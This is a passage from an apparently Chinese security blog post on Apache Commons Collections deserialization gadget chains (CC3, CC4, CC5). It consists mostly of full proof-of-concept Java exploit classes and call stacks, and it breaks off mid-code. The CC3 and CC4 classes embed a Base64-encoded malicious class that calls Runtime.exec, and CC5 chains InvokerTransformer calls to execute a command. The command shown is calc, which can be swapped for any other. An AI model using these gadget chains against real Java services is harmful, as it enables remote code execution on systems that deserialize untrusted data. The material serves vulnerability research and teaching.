java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">transform:106, InstantiateTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:53, CommonsCollections3 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections4（CC2-TrAXFilter）"><a href="#CommonsCollections4（CC2-TrAXFilter）" class="headerlink" title="CommonsCollections4（CC2+TrAXFilter）"></a>CommonsCollections4（CC2+TrAXFilter）</h3><p>在 CC2 的基础上借助 <code>TrAXFilter</code>+<code>TemplatesImpl</code> 加载字节码绕过对 <code>InvokerTransformer</code> 的过滤，另外我把 <code>TrAXFilter.class</code> 存到 <code>PriorityQueue</code> 中可以避免 <code>Transformer</code> 数组。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">defineClass:<span class="number">142</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">346</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">383</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">transform:<span class="number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:<span class="number">40</span>, CommonsCollections4 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"><a href="#CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）" class="headerlink" title="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"></a>CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）</h3><p><code>javax.management.BadAttributeValueExpException</code> 在反序列化 <code>readObject</code> 时如果满足 <code>System.getSecurityManager() == null</code> 条件时会对其中的 <code>val</code> 成员调用 <code>toString</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 <code>TiedMapEntry</code> 的 <code>toString</code> 方法最终会调用到 <code>map.get</code> 方法，正好可以与 <code>LazyMap</code> 的利用链结合。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>POC 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(exception);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span 